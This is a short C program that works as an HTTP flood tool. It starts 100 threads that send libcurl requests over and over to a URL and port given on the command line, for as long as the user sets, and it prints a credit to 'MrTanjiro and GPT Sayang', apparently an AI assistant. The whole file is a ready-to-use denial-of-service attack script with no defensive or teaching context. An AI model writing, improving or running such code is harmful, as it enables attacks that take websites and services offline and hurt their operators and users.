#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>
#include <curl/curl.h>
#include <string.h>
#include <unistd.h>
#include <time.h>

#define THREADS 100

char* target_url;
int attack_duration;

void* flood(void* arg) {
    CURL *curl;
    CURLcode res;
    time_t start_time = time(NULL);

    curl_global_init(CURL_GLOBAL_ALL);

    while (time(NULL) - start_time < attack_duration) {
        curl = curl_easy_init();
        if (curl) {
            curl_easy_setopt(curl, CURLOPT_URL, target_url);
            curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);
            curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
            curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, NULL); // No output
            res = curl_easy_perform(curl);
            curl_easy_cleanup(curl);
        }
    }

    curl_global_cleanup();
    pthread_exit(NULL);
}

int main(int argc, char* argv[]) {
    if (argc != 4) {
        return 1;
    }

    char* ip_or_url = argv[1];
    int port = atoi(argv[2]);
    attack_duration = atoi(argv[3]);

    char full_url[512];
    snprintf(full_url, sizeof(full_url), "%s:%d", ip_or_url, port);
    target_url = full_url;

    printf("Method by MrTanjiro and GPT Sayang\n");

    pthread_t threads[THREADS];

    for (int i = 0; i < THREADS; i++) {
        pthread_create(&threads[i], NULL, flood, NULL);
    }

    for (int i = 0; i < THREADS; i++) {
        pthread_join(threads[i], NULL);
    }

    return 0;
}
